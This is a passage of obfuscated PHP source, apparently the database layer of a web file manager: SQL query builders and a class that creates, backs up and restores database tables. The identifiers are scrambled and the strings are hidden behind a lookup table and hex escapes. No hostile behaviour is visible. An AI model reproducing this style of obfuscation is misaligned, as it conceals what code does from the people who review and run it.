$‹‘Ó“áÎ[0])) { if (is_array($‹‘Ó“áÎ[1])) { $íÜâÃ½ = isset($‹‘Ó“áÎ[2]) ? strtoupper($‹‘Ó“áÎ[2]) : $Ù¦àı¼û[1016]; if (in_array($íÜâÃ½, array($Ù¦àı¼û[1015], $Ù¦àı¼û[1016], $Ù¦àı¼û[1017]))) { $œ¡‡Ó‹• = array(); foreach ($‹‘Ó“áÎ[1] as $“ö÷ÀÃ¯) { $œ¡‡Ó‹•[] = $á²‚¯ . $Ù¦àı¼û[53] . $this->exp[$“üô°­] . $Ù¦àı¼û[53] . $this->parseValue($“ö÷ÀÃ¯); } $Š§ª´¡« .= $Ù¦àı¼û[260] . implode($Ù¦àı¼û[53] . $íÜâÃ½ . $Ù¦àı¼û[53], $œ¡‡Ó‹•) . $Ù¦àı¼û[919]; } } else { $Š§ª´¡« .= $á²‚¯ . $Ù¦àı¼û[53] . $this->exp[$“üô°­] . $Ù¦àı¼û[53] . $this->parseValue($‹‘Ó“áÎ[1]); } } elseif ($Ù¦àı¼û[297] == $“üô°­) { $Š§ª´¡« .= $Ù¦àı¼û[917] . $á²‚¯ . $Ù¦àı¼û[53] . $‹‘Ó“áÎ[1] . $Ù¦àı¼û[1032]; } elseif (preg_match($Ù¦àı¼û[1033], $‹‘Ó“áÎ[0])) { $Š§ª´¡« .= $‹‘Ó“áÎ[0]; } elseif (preg_match($Ù¦àı¼û[1034], $‹‘Ó“áÎ[0])) { if (isset($‹‘Ó“áÎ[2]) && $Ù¦àı¼û[297] == $‹‘Ó“áÎ[2]) { $Š§ª´¡« .= $á²‚¯ . $Ù¦àı¼û[53] . $this->exp[$“üô°­] . $Ù¦àı¼û[53] . $‹‘Ó“áÎ[1]; } else { if (is_string($‹‘Ó“áÎ[1])) { $‹‘Ó“áÎ[1] = explode($Ù¦àı¼û[50], $‹‘Ó“áÎ[1]); } $ºï·îêø = implode($Ù¦àı¼û[50], $this->parseValue($‹‘Ó“áÎ[1])); $Š§ª´¡« .= $á²‚¯ . $Ù¦àı¼û[53] . $this->exp[$“üô°­] . $Ù¦àı¼û[917] . $ºï·îêø . $Ù¦àı¼û[919]; } } elseif (preg_match($Ù¦àı¼û[1035], $‹‘Ó“áÎ[0])) { $‹•åíÂ = is_string($‹‘Ó“áÎ[1]) ? explode($Ù¦àı¼û[50], $‹‘Ó“áÎ[1]) : $‹‘Ó“áÎ[1]; $Š§ª´¡« .= $Ù¦àı¼û[917] . $á²‚¯ . $Ù¦àı¼û[53] . $this->exp[$“üô°­] . $Ù¦àı¼û[53] . $this->parseValue($‹•åíÂ[0]) . $Ù¦àı¼û[1018] . $this->parseValue($‹•åíÂ[1]) . $Ù¦àı¼û[278]; } else { think_exception(think_lang($Ù¦àı¼û[1021]) . $Ù¦àı¼û[4] . $‹‘Ó“áÎ[0]); } } else { $ÌÄóö¢Ù = count($‹‘Ó“áÎ); $Ä‹ÛÓ¬„ = $Ù¦àı¼û[12]; if (is_string($‹‘Ó“áÎ[$ÌÄóö¢Ù - 1])) { $Ä‹ÛÓ¬„ = isset($‹‘Ó“áÎ[$ÌÄóö¢Ù - 1]) ? strtoupper($‹‘Ó“áÎ[$ÌÄóö¢Ù - 1]) : $Ù¦àı¼û[12]; if (in_array($Ä‹ÛÓ¬„, array($Ù¦àı¼û[1015], $Ù¦àı¼û[1016], $Ù¦àı¼û[1017]))) { $ÌÄóö¢Ù = $ÌÄóö¢Ù - 1; } } else { $Ä‹ÛÓ¬„ = $Ù¦àı¼û[1015]; } for ($ÎÆ™ = 0; $ÎÆ™ < $ÌÄóö¢Ù; $ÎÆ™++) { $‹•åíÂ = is_array($‹‘Ó“áÎ[$ÎÆ™]) ? $‹‘Ó“áÎ[$ÎÆ™][1] : $‹‘Ó“áÎ[$ÎÆ™]; if ($Ù¦àı¼û[297] == strtolower($‹‘Ó“áÎ[$ÎÆ™][0])) { $Š§ª´¡« .= $Ù¦àı¼û[260] . $á²‚¯ . $Ù¦àı¼û[53] . $‹•åíÂ . $Ù¦àı¼û[1032] . $Ä‹ÛÓ¬„ . $Ù¦àı¼û[53]; } else { $Õ°÷™ŒØ = is_array($‹‘Ó“áÎ[$ÎÆ™]) ? $this->exp[strtolower($‹‘Ó“áÎ[$ÎÆ™][0])] : $Ù¦àı¼û[898]; if (!$Õ°÷™ŒØ && is_array($‹‘Ó“áÎ[$ÎÆ™]) && in_array($‹‘Ó“áÎ[$ÎÆ™][0], array($Ù¦àı¼û[898], $Ù¦àı¼û[1025], $Ù¦àı¼û[1026], $Ù¦àı¼û[1027], $Ù¦àı¼û[1028], $Ù¦àı¼û[1029]))) { $Õ°÷™ŒØ = $‹‘Ó“áÎ[$ÎÆ™][0]; } $Š§ª´¡« .= $Ù¦àı¼û[260] . $á²‚¯ . $Ù¦àı¼û[53] . $Õ°÷™ŒØ . $Ù¦àı¼û[53] . $this->parseValue($‹•åíÂ) . $Ù¦àı¼û[1032] . $Ä‹ÛÓ¬„ . $Ù¦àı¼û[53]; } } $Š§ª´¡« = substr($Š§ª´¡«, 0, -4); } } else { $Š§ª´¡« .= $á²‚¯ . $Ù¦àı¼û[1036] . $this->parseValue($‹‘Ó“áÎ); } return $Š§ª´¡«; } protected function parseThinkWhere($ ¾³…Î, $ìË’Áèª) { $ôªª°¸² =& $_SERVER[Ã¶¡¶„æ]; $‰”±‰ó” = $ôªª°¸²[12]; switch ($ ¾³…Î) { case $ôªª°¸²[352]: $‰”±‰ó” = $ìË’Áèª; break; case $ôªª°¸²[1019]: $‰”±‰ó” = is_string($ìË’Áèª) ? $ìË’Áèª : substr($this->parseWhere($ìË’Áèª), 6); break; case $ôªª°¸²[1037]: parse_str($ìË’Áèª, $Áñß¡Ôç); if (isset($Áñß¡Ôç[$ôªª°¸²[1014]])) { $õ«êëÖí = $ôªª°¸²[53] . strtoupper($Áñß¡Ôç[$ôªª°¸²[1014]]) . $ôªª°¸²[53]; unset($Áñß¡Ôç[$ôªª°¸²[1014]]); } else { $õ«êëÖí = $ôªª°¸²[1018]; } $Œ¸úÏ = array(); foreach ($Áñß¡Ôç as $Á†Òğø => $êÄÈ¼™) { $Œ¸úÏ[] = $this->parseKey($Á†Òğø) . $ôªª°¸²[1036] . $this->parseValue($êÄÈ¼™); } $‰”±‰ó” = implode($õ«êëÖí, $Œ¸úÏ); break; } return $‰”±‰ó”; } protected function parseLimit($–Ëœû¾) { $­ú„µùü =& $_SERVER[Ã¶¡¶„æ]; return !empty($–Ëœû¾) ? $­ú„µùü[51] . $–Ëœû¾ . $­ú„µùü[53] : $­ú„µùü[12]; } protected function parseJoin($Ùº³ÈÇ¥) { $ÕÚğâ™ç =& $_SERVER[Ã¶¡¶„æ]; $‰¬°ªæÂ = $ÕÚğâ™ç[12]; if (!empty($Ùº³ÈÇ¥)) { if (is_array($Ùº³ÈÇ¥)) { foreach ($Ùº³ÈÇ¥ as $…¡‹”›” => $“éÜ¼™) { if (!1 !== stripos($“éÜ¼™, $ÕÚğâ™ç[1038])) { $‰¬°ªæÂ .= $ÕÚğâ™ç[53] . $“éÜ¼™; } else { $‰¬°ªæÂ .= $ÕÚğâ™ç[1039] . $“éÜ¼™; } } } else { $‰¬°ªæÂ .= $ÕÚğâ™ç[1039] . $Ùº³ÈÇ¥; } } $‰¬°ªæÂ = preg_replace($ÕÚğâ™ç[1040], think_config($ÕÚğâ™ç[944]) . $ÕÚğâ™ç[1041], $‰¬°ªæÂ); return $‰¬°ªæÂ; } protected function parseOrder($ÊÉ¸ ¤£) { $ÄÉ°€Õ¯ =& $_SERVER[Ã¶¡¶„æ]; if (is_array($ÊÉ¸ ¤£)) { $™òç‘¤­ = array(); foreach ($ÊÉ¸ ¤£ as $Íê‚ìº => $êı¡ˆ…µ) { if (is_numeric($Íê‚ìº)) { $™òç‘¤­[] = $this->parseKey($êı¡ˆ…µ); } else { $êı¡ˆ…µ = in_array(strtoupper(trim($êı¡ˆ…µ)), array($ÄÉ°€Õ¯[1042], $ÄÉ°€Õ¯[1043])) ? $ÄÉ°€Õ¯[53] . $êı¡ˆ…µ : $ÄÉ°€Õ¯[12]; if (preg_match($ÄÉ°€Õ¯[1044], $Íê‚ìº)) { $™òç‘¤­[] = $this->parseKey($Íê‚ìº) . $êı¡ˆ…µ; } else { think_exception($ÄÉ°€Õ¯[1045] . $Íê‚ìº); } } } $ÊÉ¸ ¤£ = implode($ÄÉ°€Õ¯[50], $™òç‘¤­); } return !empty($ÊÉ¸ ¤£) ? $ÄÉ°€Õ¯[1046] . $ÊÉ¸ ¤£ : $ÄÉ°€Õ¯[12]; } protected function parseGroup($åÈ™·è) { $¬¬îã® =& $_SERVER[Ã¶¡¶„æ]; return !empty($åÈ™·è) ? $¬¬îã®[1047] . $åÈ™·è : $¬¬îã®[12]; } protected function parseHaving($úƒşõ’) { $ñÏ¤ûÊ— =& $_SERVER[Ã¶¡¶„æ]; return !empty($úƒşõ’) ? $ñÏ¤ûÊ—[1048] . $úƒşõ’ : $ñÏ¤ûÊ—[12]; } protected function parseComment($ê•©Ç×Ã) { $ŸØÌïĞó =& $_SERVER[Ã¶¡¶„æ]; return !empty($ê•©Ç×Ã) ? $ŸØÌïĞó[1049] . $ê•©Ç×Ã . $ŸØÌïĞó[1050] : $ŸØÌïĞó[12]; } protected function parseDistinct($ºâ³š³Ì) { $öÀ­„ŠÁ =& $_SERVER[Ã¶¡¶„æ]; return !empty($ºâ³š³Ì) ? $öÀ­„ŠÁ[1051] : $öÀ­„ŠÁ[12]; } protected function parseUnion($óì²´œ) { $“¬•‹  =& $_SERVER[Ã¶¡¶„æ]; if (empty($óì²´œ)) { return $“¬•‹ [12]; } if (isset($óì²´œ[$“¬•‹ [348]])) { $İ‡çöà· = $“¬•‹ [1052]; unset($óì²´œ[$“¬•‹ [348]]); } else { $İ‡çöà· = $“¬•‹ [1053]; } foreach ($óì²´œ as $ÚÕÃÏß) { $É¨äÃß¿[] = $İ‡çöà· . (is_array($ÚÕÃÏß) ? $this->buildSelectSql($ÚÕÃÏß) : $ÚÕÃÏß); } return implode($“¬•‹ [53], $É¨äÃß¿); } public function insert($Î¦®¿ÙŸ, $¸Ã³Ş¥ = array(), $³ı–³¥Ç = false) { $¬¹¿™Í« =& $_SERVER[Ã¶¡¶„æ]; $µ«€ ¦Š = $Î²Œ­¡ã = array(); $this->model = $¸Ã³Ş¥[$¬¹¿™Í«[281]]; foreach ($Î¦®¿ÙŸ as $ËÂÓË½Ç => $¦±³¥÷) { if (is_array($¦±³¥÷) && $¬¹¿™Í«[297] == $¦±³¥÷[0]) { $Î²Œ­¡ã[] = $this->parseKey($ËÂÓË½Ç); $µ«€ ¦Š[] = $¦±³¥÷[1]; } elseif (is_scalar($¦±³¥÷) || is_null($¦±³¥÷)) { $Î²Œ­¡ã[] = $this->parseKey($ËÂÓË½Ç); $µ«€ ¦Š[] = $this->parseValue($¦±³¥÷); } } $Ëá´ = ($³ı–³¥Ç ? $¬¹¿™Í«[921] : $¬¹¿™Í«[922]) . $¬¹¿™Í«[923] . $this->parseTable($¸Ã³Ş¥[$¬¹¿™Í«[279]]) . $¬¹¿™Í«[917] . implode($¬¹¿™Í«[50], $Î²Œ­¡ã) . $¬¹¿™Í«[918] . implode($¬¹¿™Í«[50], $µ«€ ¦Š) . $¬¹¿™Í«[919]; $Ëá´ .= $this->parseLock(isset($¸Ã³Ş¥[$¬¹¿™Í«[857]]) ? $¸Ã³Ş¥[$¬¹¿™Í«[857]] : !1); $Ëá´ .= $this->parseComment(!empty($¸Ã³Ş¥[$¬¹¿™Í«[354]]) ? $¸Ã³Ş¥[$¬¹¿™Í«[354]] : $¬¹¿™Í«[12]); return $this->execute($Ëá´, $this->parseBind(!empty($¸Ã³Ş¥[$¬¹¿™Í«[285]]) ? $¸Ã³Ş¥[$¬¹¿™Í«[285]] : array())); } public function selectInsert($ÛÎ—›€·, $Ÿë¾ÁÏ×, $§ŒÎ½ıÕ = array()) { $Šó–œîƒ =& $_SERVER[Ã¶¡¶„æ]; $this->model = $§ŒÎ½ıÕ[$Šó–œîƒ[281]]; if (is_string($ÛÎ—›€·)) { $ÛÎ—›€· = explode($Šó–œîƒ[50], $ÛÎ—›€·); } array_walk($ÛÎ—›€·, array($this, $Šó–œîƒ[920])); $ãşÚŒÆ° = $Šó–œîƒ[1054] . $this->parseTable($Ÿë¾ÁÏ×) . $Šó–œîƒ[917] . implode($Šó–œîƒ[50], $ÛÎ—›€·) . $Šó–œîƒ[1032]; $ãşÚŒÆ° .= $this->buildSelectSql($§ŒÎ½ıÕ); return $this->execute($ãşÚŒÆ°, $this->parseBind(!empty($§ŒÎ½ıÕ[$Šó–œîƒ[285]]) ? $§ŒÎ½ıÕ[$Šó–œîƒ[285]] : array())); } public function update($æßóÆÊß, $ıÒáâÒ¥) { $‹Âğ”ïœ =& $_SERVER[Ã¶¡¶„æ]; $this->model = $ıÒáâÒ¥[$‹Âğ”ïœ[281]]; $á€¾¶à“ = $‹Âğ”ïœ[1055] . $this->parseTable($ıÒáâÒ¥[$‹Âğ”ïœ[279]]) . $this->parseSet($æßóÆÊß) . $this->parseWhere(!empty($ıÒáâÒ¥[$‹Âğ”ïœ[275]]) ? $ıÒáâÒ¥[$‹Âğ”ïœ[275]] : $‹Âğ”ïœ[12]) . $this->parseOrder(!empty($ıÒáâÒ¥[$‹Âğ”ïœ[365]]) ? $ıÒáâÒ¥[$‹Âğ”ïœ[365]] : $‹Âğ”ïœ[12]) . $this->parseLimit(!empty($ıÒáâÒ¥[$‹Âğ”ïœ[292]]) ? $ıÒáâÒ¥[$‹Âğ”ïœ[292]] : $‹Âğ”ïœ[12]) . $this->parseLock(isset($ıÒáâÒ¥[$‹Âğ”ïœ[857]]) ? $ıÒáâÒ¥[$‹Âğ”ïœ[857]] : !1) . $this->parseComment(!empty($ıÒáâÒ¥[$‹Âğ”ïœ[354]]) ? $ıÒáâÒ¥[$‹Âğ”ïœ[354]] : $‹Âğ”ïœ[12]); return $this->execute($á€¾¶à“, $this->parseBind(!empty($ıÒáâÒ¥[$‹Âğ”ïœ[285]]) ? $ıÒáâÒ¥[$‹Âğ”ïœ[285]] : array())); } public function delete($•ø¥ŞÉÀ = array()) { $”äãäí§ =& $_SERVER[Ã¶¡¶„æ]; $this->model = $•ø¥ŞÉÀ[$”äãäí§[281]]; $şê§˜Â¹ = $”äãäí§[1056] . $this->parseTable($•ø¥ŞÉÀ[$”äãäí§[279]]) . $this->parseWhere(!empty($•ø¥ŞÉÀ[$”äãäí§[275]]) ? $•ø¥ŞÉÀ[$”äãäí§[275]] : $”äãäí§[12]) . $this->parseOrder(!empty($•ø¥ŞÉÀ[$”äãäí§[365]]) ? $•ø¥ŞÉÀ[$”äãäí§[365]] : $”äãäí§[12]) . $this->parseLimit(!empty($•ø¥ŞÉÀ[$”äãäí§[292]]) ? $•ø¥ŞÉÀ[$”äãäí§[292]] : $”äãäí§[12]) . $this->parseLock(isset($•ø¥ŞÉÀ[$”äãäí§[857]]) ? $•ø¥ŞÉÀ[$”äãäí§[857]] : !1) . $this->parseComment(!empty($•ø¥ŞÉÀ[$”äãäí§[354]]) ? $•ø¥ŞÉÀ[$”äãäí§[354]] : $”äãäí§[12]); return $this->execute($şê§˜Â¹, $this->parseBind(!empty($•ø¥ŞÉÀ[$”äãäí§[285]]) ? $•ø¥ŞÉÀ[$”äãäí§[285]] : array())); } public function select($ñÑĞ‚‰² = array()) { $‰Ù°›ÏÂ =& $_SERVER[Ã¶¡¶„æ]; $this->model = $ñÑĞ‚‰²[$‰Ù°›ÏÂ[281]]; $®Ø“•¡‚ = $this->buildSelectSql($ñÑĞ‚‰²); $˜Åµ—ÛÚ = isset($ñÑĞ‚‰²[$‰Ù°›ÏÂ[349]]) ? $ñÑĞ‚‰²[$‰Ù°›ÏÂ[349]] : !1; if ($˜Åµ—ÛÚ) { $Á¶­ÒÁ = is_string($˜Åµ—ÛÚ[$‰Ù°›ÏÂ[94]]) ? $˜Åµ—ÛÚ[$‰Ù°›ÏÂ[94]] : $‰Ù°›ÏÂ[1057] . md5($®Ø“•¡‚); $¢©„Œ–° = think_cache($Á¶­ÒÁ, $‰Ù°›ÏÂ[12], $˜Åµ—ÛÚ); if (!1 !== $¢©„Œ–°) { return $¢©„Œ–°; } } $«´²Ä€¬ = $this->query($®Ø“•¡‚, $this->parseBind(!empty($ñÑĞ‚‰²[$‰Ù°›ÏÂ[285]]) ? $ñÑĞ‚‰²[$‰Ù°›ÏÂ[285]] : array())); if ($˜Åµ—ÛÚ && !1 !== $«´²Ä€¬) { think_cache($Á¶­ÒÁ, $«´²Ä€¬, $˜Åµ—ÛÚ); } return $«´²Ä€¬; } public function buildSelectSql($÷ˆ×Ç¦ = array()) { $¢ù ¶êŸ =& $_SERVER[Ã¶¡¶„æ]; if (isset($÷ˆ×Ç¦[$¢ù ¶êŸ[353]])) { if (strpos($÷ˆ×Ç¦[$¢ù ¶êŸ[353]], $¢ù ¶êŸ[50])) { list($ğê¡…™š, $ºûê­Í‘) = explode($¢ù ¶êŸ[50], $÷ˆ×Ç¦[$¢ù ¶êŸ[353]]); } else { $ğê¡…™š = $÷ˆ×Ç¦[$¢ù ¶êŸ[353]]; } $ğê¡…™š = $ğê¡…™š ? $ğê¡…™š : 1; $ºûê­Í‘ = isset($ºûê­Í‘) ? $ºûê­Í‘ : (is_numeric($÷ˆ×Ç¦[$¢ù ¶êŸ[292]]) ? $÷ˆ×Ç¦[$¢ù ¶êŸ[292]] : 20); $¦´‚íü§ = $ºûê­Í‘ * ((int) $ğê¡…™š - 1); $÷ˆ×Ç¦[$¢ù ¶êŸ[292]] = $¦´‚íü§ . $¢ù ¶êŸ[50] . $ºûê­Í‘; } if (think_config($¢ù ¶êŸ[1058])) { $·¥‡„˜Ì = $¢ù ¶êŸ[1059] . md5(serialize($÷ˆ×Ç¦)); $¯Ä¾Â  = think_cache($·¥‡„˜Ì); if ($¯Ä¾Â ) { return $¯Ä¾Â ; } } $‰¿’ò½Ï = $this->parseSql($this->selectSql, $÷ˆ×Ç¦); $‰¿’ò½Ï .= $this->parseLock(isset($÷ˆ×Ç¦[$¢ù ¶êŸ[857]]) ? $÷ˆ×Ç¦[$¢ù ¶êŸ[857]] : !1); if (isset($·¥‡„˜Ì)) { think_cache($·¥‡„˜Ì, $‰¿’ò½Ï); } return $‰¿’ò½Ï; } public function parseSql($Ìµ®âš”, $ı××åÓï = array()) { $³º§áæÎ =& $_SERVER[Ã¶¡¶„æ]; $Ìµ®âš” = str_replace(array($³º§áæÎ[1060], $³º§áæÎ[1061], $³º§áæÎ[1062], $³º§áæÎ[1063], $³º§áæÎ[1064], $³º§áæÎ[1065], $³º§áæÎ[1066], $³º§áæÎ[1067], $³º§áæÎ[1068], $³º§áæÎ[1069], $³º§áæÎ[1070]), array($this->parseTable("{$ı××åÓï[$³º§áæÎ[279]]}"), $this->parseDistinct(isset($ı××åÓï[$³º§áæÎ[1071]]) ? $ı××åÓï[$³º§áæÎ[1071]] : !1), $this->parseField(!empty($ı××åÓï[$³º§áæÎ[273]]) ? $ı××åÓï[$³º§áæÎ[273]] : $³º§áæÎ[188]), $this->parseJoin(!empty($ı××åÓï[$³º§áæÎ[282]]) ? $ı××åÓï[$³º§áæÎ[282]] : $³º§áæÎ[12]), $this->parseWhere(!empty($ı××åÓï[$³º§áæÎ[275]]) ? $ı××åÓï[$³º§áæÎ[275]] : $³º§áæÎ[12]), $this->parseGroup(!empty($ı××åÓï[$³º§áæÎ[515]]) ? $ı××åÓï[$³º§áæÎ[515]] : $³º§áæÎ[12]), $this->parseHaving(!empty($ı××åÓï[$³º§áæÎ[1072]]) ? $ı××åÓï[$³º§áæÎ[1072]] : $³º§áæÎ[12]), $this->parseOrder(!empty($ı××åÓï[$³º§áæÎ[365]]) ? $ı××åÓï[$³º§áæÎ[365]] : $³º§áæÎ[12]), $this->parseLimit(!empty($ı××åÓï[$³º§áæÎ[292]]) ? $ı××åÓï[$³º§áæÎ[292]] : $³º§áæÎ[12]), $this->parseUnion(!empty($ı××åÓï[$³º§áæÎ[347]]) ? $ı××åÓï[$³º§áæÎ[347]] : $³º§áæÎ[12]), $this->parseComment(!empty($ı××åÓï[$³º§áæÎ[354]]) ? $ı××åÓï[$³º§áæÎ[354]] : $³º§áæÎ[12])), $Ìµ®âš”); return $Ìµ®âš”; } public function getLastSql($øÈ¥Æãï = '') { return $øÈ¥Æãï ? $this->modelSql[$øÈ¥Æãï] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ä¦à…‡„) { return addslashes($ä¦à…‡„); } public function setModel($öÃõ¾‰Ä) { $this->model = $öÃõ¾‰Ä; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¶¯÷åÄ‚ = array()) { $Æíã—½ö =& $_SERVER[Ã¶¡¶„æ]; if (empty($¶¯÷åÄ‚)) { $¶¯÷åÄ‚ = $GLOBALS[$Æíã—½ö[6]][$Æíã—½ö[21]]; } $this->database = $¶¯÷åÄ‚; } public function model($î ÍÚÚÔ = '') { return new ModelBase($î ÍÚÚÔ, $_SERVER[Ã¶¡¶„æ][12], $this->database); } public function db($µÜ«¦±Š = false) { $‡à ‰ıñ =& $_SERVER[Ã¶¡¶„æ]; $Å¹­…é  = array_change_key_case($this->database); if ($this->dbType() == $‡à ‰ıñ[13] || !$µÜ«¦±Š) { return $this->model()->db(); } $ëöµË—® = $Å¹­…é [$‡à ‰ıñ[986]]; $Å¹­…é [$‡à ‰ıñ[986]] = $‡à ‰ıñ[12]; if ($Å¹­…é [$‡à ‰ıñ[981]] == $‡à ‰ıñ[978]) { $ËŞ¼Ù©Ã = $Å¹­…é [$‡à ‰ıñ[987]]; $Å¹­…é [$‡à ‰ıñ[987]] = substr($ËŞ¼Ù©Ã, 0, strrpos($ËŞ¼Ù©Ã, $‡à ‰ıñ[1073])); } $this->database = $Å¹­…é ; $¦û±Ùíé = $this->model()->db(); try { $—ÖÍ¤åù = $¦û±Ùíé->execute("\x73\150\x6f\x77\40\x64\x61\164\x61\x62\141\x73\145\163\x20\x6c\151\153\145\x20\47{$ëöµË—®}\47"); } catch (Exception $œı“Ú…) { } if (!$—ÖÍ¤åù) { $¦û±Ùíé->execute("\x63\162\145\141\x74\x65\40\x64\x61\164\141\x62\141\x73\x65\x20\140{$ëöµË—®}\140"); } $Å¹­…é [$‡à ‰ıñ[986]] = $ëöµË—®; if ($Å¹­…é [$‡à ‰ıñ[981]] == $‡à ‰ıñ[978]) { $Å¹­…é [$‡à ‰ıñ[987]] .= $‡à ‰ıñ[1073] . $ëöµË—®; } $this->database = $Å¹­…é ; $¦û±Ùíé->execute("\165\163\x65\40\x60{$ëöµË—®}\x60"); return $¦û±Ùíé; } public function createTable($¶÷©Êù, &$Èß«À›²) { $°˜àŠÈ– =& $_SERVER[Ã¶¡¶„æ]; if (!IO::exist($¶÷©Êù)) { ActionCall($°˜àŠÈ–[1074], !0, 0); show_json(LNG($°˜àŠÈ–[1075]), !1); } $¼ÃùÀ¯ = $this->model()->db(); $ÍÅÆ¡Ù = sqlSplit(IO::getContent($¶÷©Êù)); foreach ($ÍÅÆ¡Ù as $ÖãËÌ‘¸) { $Ì†ùæ‚ş = stripos($ÖãËÌ‘¸, $°˜àŠÈ–[1076]) === 0; if ($Ì†ùæ‚ş) { $Èß«À›²->task[$°˜àŠÈ–[792]] += 1; } $¼ÃùÀ¯->execute($ÖãËÌ‘¸); if ($Ì†ùæ‚ş) { preg_match($°˜àŠÈ–[1077], $ÖãËÌ‘¸, $‹Şœéë); $Èß«À›²->task[$°˜àŠÈ–[1078]] = $‹Şœéë[1]; $Èß«À›²->update(1); } } } public function insertTable($‘†Æ´Æí, &$¿™®æÍ«) { $¬òÎ„Ş =& $_SERVER[Ã¶¡¶„æ]; $—éêîæ = $this->model()->db(); $ìãîé¼ş = $Ø½Ÿ£¤• ? array($Ø½Ÿ£¤•) : $—éêîæ->getTables(); foreach ($‘†Æ´Æí as $ğÃÓ‘–) { $Ø½Ÿ£¤• = basename($ğÃÓ‘–, $¬òÎ„Ş[794]); if (!in_array($Ø½Ÿ£¤•, $ìãîé¼ş)) { continue; } $¿™®æÍ«->task[$¬òÎ„Ş[1078]] = $Ø½Ÿ£¤•; if (get_filesize($ğÃÓ‘–) == 0) { continue; } $Æ¨®­™ = $this->sqlToDb($ğÃÓ‘–, $¿™®æÍ«); if (!$Æ¨®­™) { ActionCall($¬òÎ„Ş[1074], !0, 0); show_json(LNG($¬òÎ„Ş[1079]) . "\x5b{$Ø½Ÿ£¤•}\135", !1); } } } public function sqlFromDb($ï™Ğî¾Ç, $‘Ìíä½, &$‡ÉÏÍŒÇ, $äø¯Ú¹š = '') { if ($‡ÉÏÍŒÇ) { $‡ÉÏÍŒÇ->task[$_SERVER[Ã¶¡¶„æ][1078]] = $ï™Ğî¾Ç; } $Ú“‘µ¦ = $this->model($ï™Ğî¾Ç); $Ì¹¬Î±Æ = 0; $òá¿î‡« = 0; $¨ïæµ²ñ = 10000; $ÊäÓÔ¸ê = fopen($‘Ìíä½, $_SERVER[Ã¶¡¶„æ][1080]); $±Ûü”©Ù = $Ú“‘µ¦->getPk(); $Ï‚ìë§Ø = $Ú“‘µ¦->getDbFields(); $š±ä´ĞÀ = $_SERVER[Ã¶¡¶„æ][12]; if ($GLOBALS[$_SERVER[Ã¶¡¶„æ][793]] && in_array($ï™Ğî¾Ç, array($_SERVER[Ã¶¡¶„æ][1081], $_SERVER[Ã¶¡¶„æ][1082]))) { $š±ä´ĞÀ = $ï™Ğî¾Ç; } do { $´®’ï = array($±Ûü”©Ù => array($_SERVER[Ã¶¡¶„æ][1028], $òá¿î‡«)); $¹ªİ£ü¢ = $Ú“‘µ¦->where($´®’ï)->field($Ï‚ìë§Ø)->order($±Ûü”©Ù . $_SERVER[Ã¶¡¶„æ][1083])->limit($¨ïæµ²ñ)->select(); $¹ªİ£ü¢ = !empty($¹ªİ£ü¢) ? $¹ªİ£ü¢ : array(); if (!($­ñ¾Ë¦ = count($¹ªİ£ü¢))) { break; } $ÇÍ¢ÎĞÜ = end($¹ªİ£ü¢); $òá¿î‡« = $ÇÍ¢ÎĞÜ[$±Ûü”©Ù]; $ÉŠÛÎûê = array(); foreach ($¹ªİ£ü¢ as $Ÿƒ†øªÙ) { if ($š±ä´ĞÀ) { if ($ï™Ğî¾Ç == $_SERVER[Ã¶¡¶„æ][1081]) { if ($Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][33]] == $_SERVER[Ã¶¡¶„æ][1084]) { $Æ›Œ‘Ò¡ = json_decode($Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][374]], !0); if ($Æ›Œ‘Ò¡[$_SERVER[Ã¶¡¶„æ][32]] == $GLOBALS[$_SERVER[Ã¶¡¶„æ][793]] && $Æ›Œ‘Ò¡[$_SERVER[Ã¶¡¶„æ][756]] != 1) { continue; } } } else { if ($Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][33]] == $_SERVER[Ã¶¡¶„æ][1085] && $Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][94]] == $_SERVER[Ã¶¡¶„æ][785]) { continue; } } } if ($äø¯Ú¹š) { $Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][84]] = "\173\151\157\x3a{$äø¯Ú¹š}\175" . substr($Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][84]], strlen("\x7b\x69\x6f\x3a{$Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][823]]}\175")); $Ÿƒ†øªÙ[$_SERVER[Ã¶¡¶„æ][823]] = $äø¯Ú¹š; } $ÉŠÛÎûê[] = $_SERVER[Ã¶¡¶„æ][1086] . $this->sqlEncode($Ÿƒ†øªÙ) . $_SERVER[Ã¶¡¶„æ][1087]; } $ÈñÅıñÇ = "\111\x4e\123\105\x52\124\x20\x49\x4e\x54\117\x20\140{$ï™Ğî¾Ç}\140\40\x28\x60" . implode($_SERVER[Ã¶¡¶„æ][1088], $Ï‚ìë§Ø) . $_SERVER[Ã¶¡¶„æ][1089]; fwrite($ÊäÓÔ¸ê, $ÈñÅıñÇ . implode($_SERVER[Ã¶¡¶„æ][1090], $ÉŠÛÎûê) . $_SERVER[Ã¶¡¶„æ][71] . PHP_EOL); $Ì¹¬Î±Æ += $­ñ¾Ë¦; if ($‡ÉÏÍŒÇ) { $‡ÉÏÍŒÇ->update($­ñ¾Ë¦); } } while ($¨ïæµ²ñ == $­ñ¾Ë¦); fclose($ÊäÓÔ¸ê); return $Ì¹¬Î±Æ; } public function sqlToDb($—¬ıèœ×, &$êÖ·í‘Ô) { $ò©µïç =& $_SERVER[Ã¶¡¶„æ]; $†Û•ÕË = $this->model()->db(); $ÎÁ×—ËÁ = @fopen($—¬ıèœ×, $ò©µïç[1091]); if (!$ÎÁ×—ËÁ) { return !1; } $»øöÖ›é = 0; $‚ÀÀ÷¶ = $ò©µïç[12]; $˜¢ş±˜ = array(); $ºü÷Ş“ = $this->dbType(); $ö´¬Òºª = $ºü÷Ş“ == $ò©µïç[13] ? 500 : 2000; $è˜îı×½ = basename($—¬ıèœ×, $ò©µïç[794]); $„»Œ•şò = 0; $×ºÎ»¹ß = 4194304 - 104858; $Ç­á™¤ = 1000000 - 104858; while (!feof($ÎÁ×—ËÁ)) { $Óú·âö = trim(fgets($ÎÁ×—ËÁ)); if (!$Óú·âö) { continue; } $ìöœÎüè = $this->sqlDecode($Óú·âö, $ºü÷Ş“, $è˜îı×½); if (stripos($ìöœÎüè, $ò©µïç[355]) === 0) { if 